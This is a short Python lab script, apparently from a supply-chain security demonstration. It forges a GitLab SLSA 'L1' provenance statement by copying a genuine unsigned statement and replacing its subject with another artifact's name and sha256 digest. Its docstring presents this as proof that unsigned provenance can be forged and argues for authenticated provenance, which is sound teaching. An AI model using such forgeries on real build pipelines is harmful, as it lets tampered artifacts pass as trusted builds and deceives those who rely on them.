#!/usr/bin/env python3
"""LAB ONLY - forge a GitLab "L1" provenance statement for any artifact.

GitLab's runner writes SLSA provenance as a plain, unsigned JSON file next to
the job artifacts (RUNNER_GENERATE_ARTIFACTS_METADATA). This script copies a
genuine statement and only swaps the subject for another file. The result is
byte-for-byte as credible as the original: nothing in it can prove who wrote it.
That is exactly what SLSA v1.2 means by L1 provenance being "trivial to bypass
or forge", and why a consumer must demand L2+ (authenticated provenance).

usage: python attacks/forge_gitlab_l1.py GENUINE_METADATA.json OTHER_ARTIFACT > forged.json
"""

import hashlib
import json
import sys
from pathlib import Path


def main(argv) -> int:
    if len(argv) != 3:
        print(__doc__, file=sys.stderr)
        return 2
    statement = json.loads(Path(argv[1]).read_text())
    artifact = Path(argv[2])
    digest = hashlib.sha256(artifact.read_bytes()).hexdigest()
    statement["subject"] = [{"name": artifact.name, "digest": {"sha256": digest}}]
    json.dump(statement, sys.stdout, indent=2)
    sys.stdout.write("\n")
    print(f"forged statement now points at {artifact.name} (sha256 {digest[:16]}...)", file=sys.stderr)
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
